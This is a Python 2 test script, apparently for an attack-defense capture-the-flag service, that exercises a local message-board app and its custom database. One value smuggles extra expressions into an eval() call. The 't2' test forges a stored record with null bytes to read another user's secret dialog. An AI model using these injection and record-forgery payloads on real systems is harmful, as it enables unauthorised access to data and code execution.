import os
import random
import re
import threading

__author__ = 'stribog'


def wtf(id, fr, msg):
    id, fr, msg = id.strip(), fr.strip(), msg.strip()
    id, fr, msg = id.decode('unicode-escape', errors='ignore'), fr, msg.encode('unicode-escape', errors='ignore')
    fr = int(fr)
    print(r"insert into messages values ('''{0}''', {1}, '''{2}''')".format(id, fr, msg))
    fr = int(fr)
    id = id.replace(u'\'', '')
    msg = msg.replace(u'\'', '')
    print(r"insert into messages values ('''{0}''', {1}, '''{2}''')".format(id, fr, msg))
    return (r"insert into messages values ('''{0}''', {1}, '''{2}''')".format(id, fr, msg))


def ev(s):
    tail = s.split(' ', 1)[1]
    r = re.compile(r'^.*?values?[ ]*(\(.*?\))$', re.M)
    z = r.match(tail)
    zz = (z.groups()[0])
    print(zz)
    print (eval(zz))


if __name__ == "__main__":
    def test1():
        id = r'''
        \ '\\ " \x22\\
        '''
        fr = r'''
        22
        '''
        msg = r'''
        ,) +  ("22", "222") #
        '''
        ev(wtf(id, fr, msg))
        # f = open('messages.db', 'r')
        # line = f.readline()
        #
        # print(repr(line))

    # test1()

    import requests as r

    def clean_test(t):
        import re

        t1 = re.sub(r'<style>[^<]*?</style>', '', t, 1)
        return re.sub(r'>[\n\r\s ]*<', '><', t1)

    def mk_data(fr=30002):
        fr = str(fr)
        d = {
            'callsign': 'some',
            'frequency': fr,
            'message': "qqqwwweeerrr",
        }
        a = r.post('http://127.0.0.1:5000/post/', d)
        print clean_test(a.text)

    freq = '0027' + str(random.randint(1001, 9999))

    def t1():
        s = r.Session()
        a = s.post('http://127.0.0.1:5000/post/', {
            'callsign': 'secr!',
            'frequency': freq,
            'message': "secret too !",
        })
        print a.url
        print a.cookies
        print clean_test(a.text)

        a = s.get('http://127.0.0.1:5000/dialog/' + freq)
        print a.url
        print a.cookies
        print clean_test(a.text)

        print '!t1', str(int(freq)) in a.text

    # mk_data(str(random.randint(1, 300000)))
    # mk_data(str(random.randint(1, 300000)))
    # mk_data(str(random.randint(1, 300000)))
    # f = open('messages.db', 'r')
    # l = repr(f.readline())
    # print(l)

    def t2():
        print 'get secret !'
        s = r.Session()
        a = s.post('http://127.0.0.1:5000/post/', {
            'callsign': '123',
            'frequency': '21' + str(random.randint(1, 300000)),
            'message': "qqqwwweeerrr" + '\x00' * 40 + '\n' +
                       's!!e\x00\x00\x00\x00\x00'
                       '' + freq + '\x00'
                                   'qqqwwweeerrr\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n',
        })
        print a.url
        print a.cookies
        print clean_test(a.text)

        a = s.get('http://127.0.0.1:5000/dialog/' + freq)
        print a.url
        print a.cookies
        print clean_test(a.text)

        print '!t2', str(int(freq)) in a.text

    # t1()
    # t2()

    def test_multi_process():
        import db
        for y in range(50):
            Messages = db.Store('messages.db', (
                ('callsign', str, 8),
                ('frequency', int, 8),
                ('message', str, 40),
            ), 5)

            def thread(y):
                for x in range(10):
                    id, fr, msg = 'qwe!', x, str(y)
                    Messages.execute(r"insert into messages values ('''{0}''', {1}, '''{2}''')".format(id, fr, msg))

            t = threading.Thread(target=thread, args=(y,))
            t.start()
            t.join()

    def test_stress():
        import requests as r
        for y in range(50):
            def thread(y):
                for x in range(10):
                    z = r.get('http://127.0.0.1:5000/')
                    print(z.status_code)

            t = threading.Thread(target=thread, args=(y,))
            t.start()
            t.join()

    print os.system('python dispatcher.checker.py put 127.0.0.1 id flag')
